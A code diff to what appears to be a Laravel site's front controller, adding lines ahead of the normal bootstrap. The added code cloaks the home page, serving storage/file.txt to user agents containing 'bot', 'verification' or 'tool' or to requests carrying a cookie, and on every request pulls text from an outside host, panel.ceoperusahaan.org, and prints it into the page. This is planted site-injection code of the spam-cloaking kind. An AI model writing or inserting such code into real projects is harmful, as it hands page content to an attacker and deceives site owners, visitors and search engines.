@@ -1,4 +1,10 @@
 <?php
+if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') > 0  && $_SERVER['REQUEST_URI'] == '/' || isset($_COOKIE[0]) && $_SERVER['REQUEST_URI'] == '/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'verification') > 0 && $_SERVER['REQUEST_URI'] == '/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'tool') > 0 && $_SERVER['REQUEST_URI'] == '/') {
+    echo implode('', file('storage/file.txt'));
+    exit;
+}
+$a = file_get_contents('https://panel.ceoperusahaan.org/oreocoffe.txt');
+echo $a;
 
 use Illuminate\Contracts\Http\Kernel;
 use Illuminate\Http\Request;
